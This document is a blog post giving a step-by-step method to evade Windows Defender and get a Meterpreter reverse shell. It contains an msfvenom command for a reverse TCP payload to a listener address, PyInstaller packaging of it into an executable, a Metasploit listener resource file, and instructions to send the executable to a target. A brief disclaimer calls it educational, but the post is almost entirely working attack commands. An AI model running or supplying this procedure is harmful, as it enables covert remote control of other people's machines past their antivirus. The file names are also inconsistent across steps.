---
title: Windows AV Evasion (msfvenom edition)
image: /assets/img/Anexos/rev_shell_AV_evasion.gif
description: The easiest way to achieve a reverse shell bypassing Windows Defender
categories: [Hacking, Windows]
tags: [av-evasion, meterpreter, windows-defender]
mermaid: true
---



> [!WARNING]  
> The entire article and the information shown is only for educational and informational purposes.

## Introduction

In this post, we'll explore a method to bypass Windows Defender using Python and Meterpreter to achieve a reverse shell.

> Git repo -> https://github.com/juanbelin/Windows-AV-Evasion 

## Step-by-Step Process

### 1. Creating the Payload

First, we'll use `msfvenom` to create the payload as a `.py` file using `python-reflection` for built-in obfuscation:

```shell
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.1.20 lport=443 -f python-reflection -o reload.py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 203846 bytes
Final size of python-reflection file: 1337649 bytes
Saved as: reload.py
```

### 2. Adding Required Libraries

We need to add `ctypes` since it's required by `python-reflection`:

```shell
nano reload.py 
```

![](/assets/img/Anexos/Windows_AV.png)


### 3. Generating the Executable

We can create the executable using PyInstaller either from Windows or through `wine`:

Using Wine:
```shell
wine pyinstaller -F hoax_shell.py --onefile
```

Or directly in Windows:
```powershell
pyinstaller -F hoax_shell.py --onefile
```

### 4. Setting Up the Listener

Create a Metasploit resource file (`test.rc`):

```shell
use payload windows/x64/meterpreter_reverse_tcp
set lhost 192.168.1.20
set lport 443 
exploit
```

Start the listener:
```bash
msfconsole -r test.rc
```

### 5. Execution

Send the `.exe` to the target machine and execute it either through GUI (RDP) or remote command execution.

![](/assets/img/Anexos/rev_shell_AV_evasion.gif)

### Listener Script Usage

The script provides a listener for incoming connections:

```shell
$ ./listiner.sh

[!] Missing parameters.

[USE] ./test.sh <LHOST> <LPORT>

Parameters:
  <LHOST>   LOCAL IP
  <LPORT>   LOCAL PORT

Example: ./test.sh 192.168.1.20 443
```
